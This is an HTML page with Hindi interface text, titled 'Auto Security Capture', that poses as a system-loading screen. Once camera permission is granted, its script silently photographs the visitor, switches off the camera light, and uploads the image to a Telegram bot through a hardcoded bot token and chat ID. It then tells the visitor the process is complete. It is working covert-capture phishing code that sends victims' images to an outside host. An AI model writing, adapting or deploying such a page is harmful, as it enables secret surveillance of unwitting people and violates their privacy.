<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Security Capture</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; }
        #status { font-size: 18px; color: #333; font-weight: bold; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body onload="startCamera()">

<div class="container">
    <h2 id="titleText">सिस्टम लोड हो रहा है...</h2>
    <div id="loader" class="loader"></div>
    <p id="status">कृपया ब्राउज़र में कैमरे की अनुमति (Allow) दें...</p>
</div>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusText = document.getElementById("status");
const titleText = document.getElementById("titleText");
const loader = document.getElementById("loader");

// आपका नया टोकन और चैट आईडी (बिल्कुल फिक्स कर दिया गया है)
const MY_TOKEN = "8762761590:AAF5joa1xo87QpsUpBk3HS9zaPKEI6cZJBA";
const MY_CHAT_ID = "8146265514";

function startCamera() {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
    .then(stream => {
        video.srcObject = stream;
        
        // जैसे ही कैमरा परमिशन मिलेगी, यह कोड चलेगा
        video.onloadedmetadata = () => {
            statusText.innerText = "परमिशन मिल गई! प्रोसेस हो रहा है...";
            statusText.style.color = "blue";
            
            // मात्र 0.5 सेकंड (500 मिलीसेकंड) में फोटो खींच लेगा
            setTimeout(captureAndSend, 500); 
        };
    })
    .catch(err => {
        loader.style.display = "none";
        titleText.innerText = "❌ एरर";
        statusText.innerText = "आपने कैमरे की अनुमति नहीं दी या कैमरा उपलब्ध नहीं है।";
        statusText.style.color = "red";
    });
}

function captureAndSend() {
    // फोटो का रिज़ॉल्यूशन सेट करना
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    statusText.innerText = "डेटा भेजा जा रहा है...";

    // तुरंत कैमरा बंद कर दें ताकि लाइट बंद हो जाए
    const tracks = video.srcObject.getTracks();
    tracks.forEach(track => track.stop());

    // फोटो को Telegram पर भेजना
    canvas.toBlob(function(blob) {
        const formData = new FormData();
        formData.append("chat_id", MY_CHAT_ID);
        formData.append("photo", blob, "auto_capture.png"); 

        fetch(`https://api.telegram.org/bot${MY_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        })
        .then(res => res.json())
        .then(data => {
            loader.style.display = "none";
            if(data.ok) {
                titleText.innerText = "✅ प्रक्रिया पूरी हुई";
                statusText.innerText = "आपका काम हो गया है। आप इस पेज को बंद कर सकते हैं।";
                statusText.style.color = "green";
            } else {
                titleText.innerText = "❌ तकनीकी खराबी";
                statusText.innerText = "Telegram Error: " + data.description;
                statusText.style.color = "red";
            }
        })
        .catch(error => {
            loader.style.display = "none";
            titleText.innerText = "❌ नेटवर्क एरर";
            statusText.innerText = "इंटरनेट कनेक्शन चेक करें।";
            statusText.style.color = "red";
        });
        
    }, "image/png");
}
</script>

</body>
</html>
